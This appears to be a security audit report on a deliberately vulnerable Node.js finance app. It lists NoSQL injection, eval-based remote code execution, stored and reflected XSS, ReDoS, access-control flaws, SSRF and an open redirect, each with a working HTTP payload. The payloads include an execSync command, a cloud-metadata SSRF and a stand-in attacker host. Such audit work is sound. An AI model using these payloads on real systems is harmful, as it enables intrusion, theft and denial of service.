title: NoSQL Injection in Asset Allocations via MongoDB $where Operator
analysis:
The application is vulnerable to NoSQL Injection via the `$where` operator in the MongoDB query. The `threshold` query parameter is directly interpolated into a JavaScript string evaluated on the database server. An attacker can inject arbitrary JavaScript code to bypass logic, extract data, or cause a denial of service on the MongoDB server.

### Conceptual Exploit Payload (Logic Bypass / Data Extraction):
```http
GET /allocations/1?threshold=1'%20||%201==1%20||%20'a'=='b HTTP/1.1
Host: localhost:5000
Cookie: <session_cookie_here>
```
This bypasses the threshold filter and forces the condition to always evaluate to true.

### Conceptual Exploit Payload (Denial of Service / Infinite Loop):
```http
GET /allocations/1?threshold=1'%20;%20while(true){}%20;%20var%20dummy='a HTTP/1.1
Host: localhost:5000
Cookie: <session_cookie_here>
```
This forces the MongoDB database engine into an infinite loop, completely blocking the database server.

title: Server-Side JavaScript Injection (SSJS) leading to Remote Code Execution via eval()
analysis:
An attacker can execute arbitrary Server-Side JavaScript code by submitting malicious inputs to the `preTax`, `afterTax`, or `roth` fields of the POST request to the `/contributions` endpoint. These parameters are directly passed to the JavaScript `eval()` function, leading to Remote Code Execution (RCE).

### Conceptual Exploit Payload:
To execute arbitrary commands and get the output back in the response:
```http
POST /contributions HTTP/1.1
Host: localhost:5000
Content-Type: application/x-www-form-urlencoded
Cookie: <session_cookie_here>

preTax=res.end(require('child_process').execSync('id').toString())&afterTax=0&roth=0
```
When this request is processed, `eval(req.body.preTax)` executes, triggering the synchronous execution of `id` on the underlying operating system and directly writing the output back to the response.

title: Global Cross-Site Scripting (XSS) Vulnerability due to Disabled Auto-escaping in Swig
analysis:
The application explicitly disables HTML auto-escaping in the Swig templating engine config. Swig is configured with `autoescape: false`, meaning any dynamic data interpolated into templates using `{{ variable }}` syntax will be rendered as-is without any HTML escaping. Consequently, any user-supplied inputs stored in the database (such as names, addresses, or website links on the Profile page, or messages on the Memos page) will lead to Stored Cross-Site Scripting (Stored XSS) when rendered to other users or the victim themselves.

### Conceptual Exploit Payload (Stored XSS via Profile):
1. Log in to the application and navigate to the Profile page (`/profile`).
2. Update the `lastName` field with the following payload:
```html
" onclick="alert(document.cookie)" type="button
```
3. Click "Submit". When the Profile page is reloaded, the template renders:
```html
<input type="text" class="form-control" id="lastName" name="lastName" value="" onclick="alert(document.cookie)" type="button" ...>
```
When any user clicks inside the input box, the injected JavaScript runs in the context of their session, potentially stealing their session cookie.

title: Regular Expression Denial of Service (ReDoS) via Catastrophic Backtracking in Profile Update
analysis:
The application is vulnerable to Regular Expression Denial of Service (ReDoS) on the Profile Update endpoint. The regular expression pattern `/([0-9]+)+\\#/` used to validate the `bankRouting` parameter contains nested greedy quantifiers (`([0-9]+)+`). If an attacker provides a long string consisting entirely of digits followed by any character other than `#` (e.g. `111111111111111111111111111111111111111111!`), the regex engine will experience catastrophic backtracking. Since Node.js runs on a single-threaded event loop, this locks up the CPU, completely blocking the server from handling any other incoming requests, thus causing a complete Denial of Service (DoS) for all users.

### Conceptual Exploit Payload:
Send a profile update POST request with a long sequence of digits in `bankRouting` that does not end with `#`:
```http
POST /profile HTTP/1.1
Host: localhost:5000
Content-Type: application/x-www-form-urlencoded
Cookie: <session_cookie_here>

firstName=John&lastName=Doe&ssn=123&dob=1990-01-01&bankAcc=123&bankRouting=11111111111111111111111111111111111111111111111111111!&address=123+St
```
This request will cause the server's CPU utilization to spike to 100% and completely freeze the application.

title: Missing/Broken Function-Level Access Control on Benefits Endpoints
analysis:
The application is vulnerable to Broken Function-Level Access Control. The endpoints `/benefits` (GET and POST) are only protected by the `isLoggedIn` middleware, which only checks if the user is authenticated. However, the comments in the source code and the business logic indicate that this functionality is administrative and should only be accessible to administrator users (roles). Due to the missing `isAdmin` middleware, any standard authenticated user can access the list of all non-admin users and update their benefit start dates.

### Conceptual Exploit Payload:
1. Log in as a standard, non-administrator user.
2. Send a GET request to `/benefits` to list all users' details:
```http
GET /benefits HTTP/1.1
Host: localhost:5000
Cookie: <non_admin_session_cookie>
```
3. Send a POST request to update another user's benefit start date:
```http
POST /benefits HTTP/1.1
Host: localhost:5000
Content-Type: application/x-www-form-urlencoded
Cookie: <non_admin_session_cookie>

userId=1&benefitStartDate=2030-01-01
```
The server will allow both operations because no privilege/role check is enforced.

title: Insecure Direct Object Reference (IDOR) on Allocations Endpoint
analysis:
The application is vulnerable to Insecure Direct Object Reference (IDOR). The endpoint `/allocations/:userId` determines which user's allocation data to retrieve based solely on the `userId` path parameter from the URL, rather than using the logged-in user's session (`req.session.userId`). Consequently, any authenticated user can view the sensitive financial allocation data of any other user by simply changing the `userId` in the URL.

### Conceptual Exploit Payload:
1. Log in as a low-privileged user (e.g., `userId = 2`).
2. Send a GET request to access user `1`'s allocations:
```http
GET /allocations/1 HTTP/1.1
Host: localhost:5000
Cookie: <session_cookie_for_user_2>
```
The server will respond with the detailed asset allocations of user 1.

title: Server-Side Request Forgery (SSRF) and Reflected XSS in Stock Research Function
analysis:
An attacker can make arbitrary requests to internal or external services (Server-Side Request Forgery - SSRF) and retrieve the responses, or conduct Reflected Cross-Site Scripting (XSS) by using the `url` query parameter. The application uses the `needle.get()` method to fetch a user-controlled URL without validation or sanitization, and then writes the response body directly back to the client response.

### Conceptual Exploit Payload (SSRF):
To scan internal ports or access cloud metadata services (like AWS metadata):
```http
GET /research?symbol=&url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: localhost:5000
Cookie: <session_cookie_here>
```

### Conceptual Exploit Payload (Reflected XSS):
To execute arbitrary client-side script in the context of the application:
```http
GET /research?symbol=&url=http://attacker-controlled-server.com/exploit.html HTTP/1.1
Host: localhost:5000
Cookie: <session_cookie_here>
```
Where `exploit.html` contains `<script>alert(document.cookie)</script>`. The server will fetch `exploit.html` and write its contents directly to the response, leading to XSS.

title: Open Redirect via /learn Endpoint
analysis:
The application is vulnerable to Open Redirect. The `/learn` endpoint takes a URL directly from the `url` query parameter and performs a redirection without any validation or whitelisting. An attacker can construct a link pointing to the `/learn` endpoint with a malicious external website as the `url` parameter. This can be used in phishing campaigns to trick users into visiting untrusted sites while believing they are navigating within the trusted application.

### Conceptual Exploit Payload:
```http
GET /learn?url=https://www.evil-attacker-site.com HTTP/1.1
Host: localhost:5000
Cookie: <session_cookie_here>
```
The server will respond with a `302 Found` redirecting the user to `https://www.evil-attacker-site.com`.
